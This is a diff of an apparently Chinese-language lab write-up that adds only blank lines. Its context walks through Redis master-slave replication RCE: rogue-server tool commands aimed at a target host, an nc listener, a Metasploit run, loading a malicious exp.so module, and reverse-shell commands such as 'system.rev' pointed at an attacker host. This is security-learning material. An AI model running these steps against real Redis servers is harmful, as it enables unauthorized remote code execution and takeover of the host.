@@ -7,6 +7,7 @@
 - exp
    - [redis-rogue-server工具 -- 未授权可用](https://github.com/n0b0dyCN/redis-rogue-server)
    - [Awsome-Redis-Rogue-Server工具 -- 未授权/有密码可用](https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server)
+
 # 0x00 前置知识
 ## 为什么考虑到利用主从复制？
 未授权的redis首先考虑写文件getshell，这种方式的主要问题在于，redis保存的数据并不是简单的json或者csv，所以写入的文件都会有大量的无用数据。
@@ -64,6 +65,7 @@ service redis-server stop
 `python3 redis-rogue-server.py --rhost 靶机ip --lhost 攻击方ip`
 
 `ifconfig`命令可正常使用：
+
 ![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637652897834-7fd95f71-6bc6-4821-9741-39a71e35987e.png#clientId=u9ca82c02-4aec-4&from=paste&height=558&id=u5480c40f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=744&originWidth=1036&originalType=binary&ratio=1&size=207473&status=done&style=none&taskId=uf7d5649b-e0ff-4e15-9f3d-336db628ad9&width=777)
 
 #### 2、redis-rogue-server 反弹shell
@@ -74,22 +76,26 @@ service redis-server stop
 2、到redis-rogue-server-master/ 目录下
 执行命令：
 `python3 redis-rogue-server.py --rhost 靶机ip --lhost 攻击方ip --lport 攻击方端口`
+
 ![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637650022763-4d08e391-d9ba-4d09-9c90-af28181f55fc.png#clientId=u9ca82c02-4aec-4&from=paste&height=317&id=u97606823&margin=%5Bobject%20Object%5D&name=image.png&originHeight=423&originWidth=1141&originalType=binary&ratio=1&size=92597&status=done&style=none&taskId=u4b47df93-fb65-4556-9e47-332de068b1d&width=856)
 
 3、获取到shell
 `ifconfig`命令无法正常执行：
+
 ![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637649974604-9f31418e-df92-4905-858d-11e58bf2f4f9.png#clientId=u9ca82c02-4aec-4&from=paste&id=u88ccee8c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=188&originWidth=818&originalType=binary&ratio=1&size=30756&status=done&style=none&taskId=u0b88ed5d-5daf-4223-b609-5a9ccd381a5)
 
 已接收到反弹的shell，可以直接执行命令，或者使用python进入交互式命令执行界面。
 `python3 -c "import pty;pty.spawn('/bin/bash')"`
 或
 `python -c "import pty;pty.spawn('/bin/bash')"`
+
 ![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637650331076-926bb2c6-b1fc-4969-a97d-7b0a3434f4d4.png#clientId=u9ca82c02-4aec-4&from=paste&id=u3dbc8802&margin=%5Bobject%20Object%5D&name=image.png&originHeight=195&originWidth=811&originalType=binary&ratio=1&size=42330&status=done&style=none&taskId=u84972786-63c4-4046-91a3-cc7c773f87c)
 
 
 #### 3、Awsome交互式 shell
 `python3 redis_rogue_server.py -rhost 靶机ip -lhost 攻击方ip`
 选择 `i`
+
 ![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637634992732-ce89f9b4-56d5-494a-a1d0-8b33d36f216c.png#clientId=u59cd1f6a-96a6-4&from=paste&height=554&id=udf823566&margin=%5Bobject%20Object%5D&name=image.png&originHeight=738&originWidth=1061&originalType=binary&ratio=1&size=202537&status=done&style=none&taskId=u2fd2fe93-5d29-4066-9111-b5877c2a01c&width=796)
 
 #### 4、Awsome反弹 shell
@@ -100,9 +106,11 @@ kali开启nc
 `python3 redis_rogue_server.py -rhost **靶机ip** -lhost **攻击方ip**`
 
 选择`r`即反弹shell，输入kali的ip和监听端口
+
 ![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637635652849-fffd9773-496e-4fa3-8352-f6f8ec28163b.png#clientId=u59cd1f6a-96a6-4&from=paste&height=235&id=uffe41062&margin=%5Bobject%20Object%5D&name=image.png&originHeight=313&originWidth=1053&originalType=binary&ratio=1&size=76818&status=done&style=none&taskId=uba0e8796-d7bc-4864-8c39-f606515487e&width=790)
 
 接收到反弹的shell：
+
 ![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637635501895-a334a773-d8a5-478c-9080-11d34aba1fc9.png#clientId=u59cd1f6a-96a6-4&from=paste&height=90&id=uae118716&margin=%5Bobject%20Object%5D&name=image.png&originHeight=120&originWidth=820&originalType=binary&ratio=1&size=25434&status=done&style=none&taskId=ua9ae4579-fb3e-42ec-94e2-4043b51df11&width=615)
 
 
@@ -113,10 +121,12 @@ kali开启nc
 
 密码设置：
 redis.conf中的`requirepass 密码`去除注释
+
 ![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637672935411-97d895a9-01a4-421a-8379-f5d28d35035c.png#clientId=u696b16cd-ca6b-4&from=paste&id=u039a92be&margin=%5Bobject%20Object%5D&name=image.png&originHeight=42&originWidth=198&originalType=binary&ratio=1&size=2417&status=done&style=none&taskId=ufa623bd5-4a51-4b78-a721-070c642ae7c)
 
 #### 1、Awsome交互式shell
 `python3 redis_rogue_server.py -rhost **靶机ip** -lhost **攻击方ip** -passwd **redis密码**`
+
 ![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637636645671-30a6b412-0d43-4d44-8d6a-b8e9025012df.png#clientId=u59cd1f6a-96a6-4&from=paste&id=ua914a5ca&margin=%5Bobject%20Object%5D&name=image.png&originHeight=735&originWidth=1189&originalType=binary&ratio=1&size=211980&status=done&style=none&taskId=ud71396b7-9fb5-4a1b-ad1f-813d57960e9)
 
 #### 2、Awsome反弹shell
@@ -127,6 +137,7 @@ kali开启nc
 `python3 redis_rogue_server.py -rhost **靶机ip** -lhost **攻击方ip**`
 
 选择`r`即反弹shell，输入kali的ip和监听端口
+
 ![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637637180658-476fba15-6342-4ac6-ab15-19df2be802a6.png#clientId=u59cd1f6a-96a6-4&from=paste&height=248&id=ua0f2d8bc&margin=%5Bobject%20Object%5D&name=image.png&originHeight=330&originWidth=1180&originalType=binary&ratio=1&size=87015&status=done&style=none&taskId=uc128425b-3fa2-43f9-8ecf-5593f886286&width=885)
 
 
@@ -134,6 +145,7 @@ kali开启nc
 `python3 -c "import pty;pty.spawn('/bin/bash')"`
 或
 `python -c "import pty;pty.spawn('/bin/bash')"`
+
 ![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637637050917-64cc7873-bf35-42c6-94d8-ab03f2e37e0a.png#clientId=u59cd1f6a-96a6-4&from=paste&height=241&id=u0ae2bf6b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=321&originWidth=844&originalType=binary&ratio=1&size=59163&status=done&style=none&taskId=ufdb23589-759a-410b-9ff8-df6f5081285&width=633)
 
 #### 3、msf反弹shell
@@ -146,6 +158,7 @@ run
 ```
 
 `shell`可进入shell界面
+
 ![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637648535529-b40d43bc-190a-441f-8867-b0fa2506d570.png#clientId=u9ca82c02-4aec-4&from=paste&height=548&id=ud48ac008&margin=%5Bobject%20Object%5D&name=image.png&originHeight=730&originWidth=900&originalType=binary&ratio=1&size=197772&status=done&style=none&taskId=u210176e7-bbfa-4852-9652-44563f358c1&width=675)
 
 # 0x03 本地Redis主从复制RCE反弹shell
@@ -170,18 +183,22 @@ run
 
 ### 1）kali开启监听
 `nc -lvvp 9999`
+
 ![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637653866888-0ac4778f-47e7-4fdc-853b-50dd72656209.png#clientId=u9ca82c02-4aec-4&from=paste&height=43&id=ucacdba1c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=58&originWidth=239&originalType=binary&ratio=1&size=6664&status=done&style=none&taskId=u64e92781-b659-4c6e-a121-70dd2728eee&width=179)
+
 ### 2）kali开启15000端口的主服务器
 ```bash
 ///// -v      #冗余模式，仅启动Rouge Server模式
 python3 redis_rogue_server.py -v -path exp.so
 ```
+
 ![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637653851438-0095c347-456e-4899-bc0d-dbafc85e6279.png#clientId=u9ca82c02-4aec-4&from=paste&id=uc768ff5c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=73&originWidth=834&originalType=binary&ratio=1&size=15455&status=done&style=none&taskId=u7f6aec39-663a-49c8-9fd6-1234dcc7012)
 
 ### 3）靶机本机登录redis开启主从模式
 `redis-cli -h 127.0.0.1 -a foobared`
 
      查看是否存在模块，可以看见目前没有可用模块
+     
 ![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637654000923-43146776-b00f-4a62-b7af-f2a22e830d81.png#clientId=u9ca82c02-4aec-4&from=paste&height=65&id=ube8dce8c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=87&originWidth=615&originalType=binary&ratio=1&size=11208&status=done&style=none&taskId=ucfd95d8c-f78f-489a-87d4-7a013fc3d65&width=461)
 
 将靶机redis服务器作为**从**服务器，
@@ -199,12 +216,14 @@ slaveof 攻击方ip 15000
 
 ```
 靶机截图：
+
 ![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637654230735-adbc8c1c-e5d1-4c9f-8057-273b39cb5977.png#clientId=u9ca82c02-4aec-4&from=paste&height=143&id=uea3e4538&margin=%5Bobject%20Object%5D&name=image.png&originHeight=190&originWidth=641&originalType=binary&ratio=1&size=23523&status=done&style=none&taskId=u45924db6-15a8-4b16-bcb7-bebaf10e020&width=481)
 
 > **FULLRESYNC 响应表示第一次复制采用的全量复制**，也就是说，主库会把当前所有的数据都复制给从库。
 
 
 可以看到kali作为主服务器，kali上出现FULLRESYNC，即**全局**同步数据中，将恶意的exp.so同步到靶机redis服务器上，同步时的截图如下：
+
 ![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637654407242-b1d75094-3b00-44d7-b8e0-481ff0c93e25.png#clientId=u9ca82c02-4aec-4&from=paste&height=373&id=ud80ca5b1&margin=%5Bobject%20Object%5D&name=image.png&originHeight=746&originWidth=932&originalType=binary&ratio=1&size=191706&status=done&style=none&taskId=u3758a789-0a87-4bfb-a7b1-cf4fa12fa4f&width=466)
 
 ### 4）靶机本机执行恶意exp.so文件模块
@@ -217,29 +236,36 @@ module load ./exp.so
 module list
 
 ```
+
 靶机redis执行恶意模块截图：
+
 ![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637654638580-cc6dd0bc-1dce-4bca-827b-b79b13848e8c.png#clientId=u9ca82c02-4aec-4&from=paste&height=150&id=ue61d2465&margin=%5Bobject%20Object%5D&name=image.png&originHeight=200&originWidth=346&originalType=binary&ratio=1&size=14608&status=done&style=none&taskId=u225b4a7a-8543-4b32-9346-a8b9dc0cc5d&width=260)
 
 靶机执行，**反弹shell**：
 ```bash
 system.rev 攻击机ip 攻击监听端口
 ```
+
 靶机执行反弹shell命令截图：
+
 ![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637655038915-4353313e-d30a-47f2-b8ce-a9af2e14a667.png#clientId=u9ca82c02-4aec-4&from=paste&height=32&id=u0ec9a921&margin=%5Bobject%20Object%5D&name=image.png&originHeight=43&originWidth=455&originalType=binary&ratio=1&size=3540&status=done&style=none&taskId=u0654600f-4398-441f-8ff3-bd63ad38f5b&width=341)
 
 kali收到反弹的shell：
+
 ![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637655208889-bad1e0f5-9472-47e5-bbd6-f8f98ca94c04.png#clientId=u9ca82c02-4aec-4&from=paste&id=ua1364d9f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=219&originWidth=840&originalType=binary&ratio=1&size=29943&status=done&style=none&taskId=ufda79f6c-a166-4d0f-a933-2c5a8fb0797)
 
 ### 5）靶机关闭主从模式
 ```bash
 slaveof NO ONE
 ```
+
 ![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637655995106-3c9d6a40-da46-4de8-873b-5de4e0b4b08c.png#clientId=u9ca82c02-4aec-4&from=paste&height=40&id=u70b8f04e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=80&originWidth=620&originalType=binary&ratio=1&size=10186&status=done&style=none&taskId=ueb8cea76-3c89-4bbe-8f71-0a36aceef7e&width=310)
 
 ### 6）另一种执行系统命令的方式：
 ```bash
 system.exec "id"
 ```
+
 ![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637657176344-8aa3cba8-b932-42af-82e0-e87d92e326d0.png#clientId=u9ca82c02-4aec-4&from=paste&id=u1883cca0&margin=%5Bobject%20Object%5D&name=image.png&originHeight=237&originWidth=981&originalType=binary&ratio=1&size=60479&status=done&style=none&taskId=u9842c092-33bc-467d-a9e5-0fd8ed9b279)
 
 
